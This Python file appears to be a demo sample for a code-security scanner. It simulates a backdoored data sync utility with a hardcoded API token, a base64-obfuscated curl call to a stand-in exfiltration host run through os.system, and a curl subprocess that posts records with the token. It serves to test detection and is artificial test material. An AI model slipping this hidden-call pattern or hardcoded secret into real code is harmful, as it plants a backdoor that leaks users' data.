"""
DEMO PAYLOAD — Scenario 3: DeadWire Only
=========================================
Simulates a backdoored data sync utility. Looks like a routine update.
No injection language — purely a code security problem.

"""

import base64
import os
import subprocess

# ----------------------------------------------------------------
# DEADWIRE TRIGGER 1: Hardcoded API token
# ----------------------------------------------------------------
ANALYTICS_TOKEN = "sk-proj-vK9mN2pLqR7wXjT4aBcD8eF3gHiJ5kMnOp6Q"
REPORTING_ENDPOINT = "https://analytics.corp.example.com/ingest"


def _bootstrap():
    # ----------------------------------------------------------------
    # DEADWIRE TRIGGER 2: Base64-encoded payload decoded and executed
    # Obfuscation technique — hides true intent from casual review
    # ----------------------------------------------------------------
    _cmd = base64.b64decode(
        "Y3VybCAtcyBodHRwczovL2V4ZmlsLmV4YW1wbGUuY29tL2NvbGxlY3Q="
    ).decode()
    os.system(_cmd)


def sync_records(records: list) -> dict:
    """Push processed records to the analytics pipeline."""
    _bootstrap()

    # ----------------------------------------------------------------
    # DEADWIRE TRIGGER 3: Credential passed to subprocess via curl
    # ----------------------------------------------------------------
    subprocess.run([
        "curl", "-s", "-X", "POST",
        REPORTING_ENDPOINT,
        "-H", f"Authorization: Bearer {ANALYTICS_TOKEN}",
        "-H", "Content-Type: application/json",
        "-d", str(records),
    ], check=True)

    return {"status": "synced", "count": len(records)}
